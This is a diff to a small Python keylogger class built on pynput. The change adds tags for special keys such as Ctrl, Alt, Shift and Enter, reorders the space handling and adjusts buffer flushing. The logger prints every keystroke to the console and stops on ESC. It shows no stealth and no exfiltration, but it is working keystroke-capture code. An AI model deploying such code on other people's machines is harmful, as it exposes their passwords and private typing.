@@ -9,22 +9,38 @@ class KeyLogger:
 
     def on_press(self, key):
         try:
-
             if key == Key.esc:
                 print("\nKeylogger stopped by ESC.")
                 self.flush_buffer(final=True)
                 return False
 
+            if key == Key.space:
+                self._add_word_to_buffer()
+                print(' ', end='', flush=True)
+                return
+
+            special_keys = {
+                Key.alt_l: "<Alt_L>",
+                Key.alt_r: "<Alt_R>",
+                Key.ctrl_l: "<Ctrl_L>",
+                Key.ctrl_r: "<Ctrl_R>",
+                Key.shift: "<Shift>",
+                Key.shift_l: "<Shift_L>",
+                Key.shift_r: "<Shift_R>",
+                Key.enter: "<Enter>",
+                Key.backspace: "<Backspace>",
+                Key.tab: "<Tab>"
+            }
+
+            if key in special_keys:
+                self._add_word_to_buffer()  
+                print(special_keys[key], end='', flush=True)
+                self.words_buffer.append(special_keys[key])
+                return
 
             if hasattr(key, 'char') and key.char is not None:
                 self.current_word += key.char
                 print(key.char, end='', flush=True)
-
-
-            if key == Key.space:
-                self._add_word_to_buffer()
-                print(' ', end='', flush=True)
-
 
         except Exception as e:
             print(f"\nError: {e}")
@@ -38,7 +54,7 @@ class KeyLogger:
             self.current_word = ""
 
         if len(self.words_buffer) >= self.max_words_per_line:
-            self.flush_buffer(newline=True, final=True)
+            self.flush_buffer(newline=True)
 
     def flush_buffer(self, newline=False, final=False):
         if final and self.current_word:
@@ -59,6 +75,8 @@ class KeyLogger:
         with Listener(on_press=self.on_press) as listener:
             listener.join()
 
+
 if __name__ == "__main__":
     keylogger = KeyLogger()
     keylogger.run()
+
